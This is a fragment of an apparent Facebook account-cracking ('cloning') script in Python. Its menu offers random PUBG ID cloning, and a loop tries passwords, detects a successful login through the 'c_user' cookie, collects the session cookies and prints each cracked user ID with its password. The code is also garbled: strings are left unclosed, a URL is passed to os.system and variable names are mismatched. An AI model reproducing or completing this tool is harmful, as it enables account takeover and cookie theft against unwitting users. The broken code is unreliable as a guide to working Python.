...
def ALONE():
	...
	ALONE	()
	if  ALONE=='4':
		os.system('xdg-open http://wa.me/+93749594545
	if ALONE1 =='3':
		os.system('https://www.facebook.com/profile.php?id=)100091476774286;ALONE()
	if ALONE1 =='2':
		bangla()
	else:
...
def annu():
    ...
    print(logo)
    print
    print('\x1b[1;97m[2] RANDOM PUBG IDZ CLONING  \x1b[1;92m2')
    print  
    print('\x1b[1;91m[4] Go to main menu')
    lines()
   ALONE  = input('[+] CHOOSE optION : ')
    if ALONE1 =='1':
    	m1()
    if ALONE1 =='2':
    	m2()
...
def m1():
    ...
    print('Press Enter to Back');ALONE()
def m2():
    user=[]
    os.system('clear')
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ALONE BRO😓]-CP] '+uid+' | '+ps+'\x1b[1;97m')
